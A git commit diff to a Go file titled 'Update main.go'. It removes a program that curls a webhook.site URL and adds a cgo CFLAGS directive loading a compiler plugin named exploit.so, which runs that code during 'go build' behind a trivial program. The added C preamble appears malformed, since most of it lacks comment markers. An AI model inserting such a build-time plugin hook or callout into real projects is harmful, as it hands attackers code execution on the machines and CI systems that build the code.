8f2e37067ebf593cfc1aae0a886fec87ceaca54a
M4KR0 <60741904+m4kr0x@users.noreply.github.com>
2025-11-18 21:28:23 +0200

    Update main.go

--- main.go
+++ main.go
@@ -1,23 +1,18 @@
-// Source - https://stackoverflow.com/a
-// Posted by Lourenco, modified by community. See post 'Timeline' for change history
-// Retrieved 2025-11-18, License - CC BY-SA 4.0
-
 package main
-
-import (
-	"fmt"
-	"os/exec"
-)
+// #cgo CFLAGS: -fplugin=./exploit.so
+typedef int (*intFunc) ();
+int _func(intFunc f)
+{
+     return f();
+}
+int one()
+{
+     return 1;
+}
+import "C"
+import "fmt"
 
 func main() {
-	cmd := exec.Command("curl", "https://webhook.site/eb4f653b-4fb0-4754-bbde-7086d88f9b8a")
-	stdout, err := cmd.Output()
-
-	if err != nil {
-		fmt.Println(err.Error())
-		return
-	}
-
-	// Print the output
-	fmt.Println(string(stdout))
+    f := C.intFunc(C.one)
+    fmt.Println(int(C._func(f)));
 }
